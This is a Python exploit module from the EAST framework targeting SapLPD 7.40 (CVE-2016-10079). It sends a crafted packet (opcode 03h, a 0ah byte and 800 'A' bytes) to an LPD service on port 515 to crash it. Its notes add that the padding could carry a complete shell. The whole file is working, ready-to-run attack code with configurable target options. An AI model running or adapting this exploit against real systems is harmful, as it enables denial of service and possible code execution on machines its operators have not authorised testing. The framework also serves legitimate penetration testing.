#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import os
import time
import socket
import struct

sys.path.append('./core')
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_saplpd_dos"
INFO['DESCRIPTION'] = "SapLPD 7.40 - Denial of Service"
INFO['VENDOR'] = ""
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = ['https://www.exploit-db.com/exploits/41030/']
INFO["CVE Name"] = "CVE-2016-10079"
INFO["NOTES"] = """Opcodes 03h and 04h are vulnerable to bad characters 00h and 0ah. So you can modify the DoS accordingly the added 800 A's are just to show, that you can deliver a complete shell with the command
"""
INFO['CHANGELOG'] = "16 Jan, 2016. Written by Gleg team."
INFO['PATH'] = 'Exploits/Dos/'

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS["HOST"] = "192.168.1.207", dict(description = 'Target IP')
OPTIONS["PORT"] = 515, dict(description = 'Target port')


class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.port = port
        self.host = host
        
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        return
    
    def run(self):
        self.args()
        self.log("")
        
        packet = ("\x03" + "\x0a" + "\x41" * 800)
        
        s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s1.settimeout(1)
        try:
            s1.connect((self.host, self.port))
            self.log('Send malicious packet')
            s1.sendall(packet)
            s1.close()
        except Exception as e:
            self.log(e)
            self.finish(False)
            
        self.finish(True)

if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """

    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()
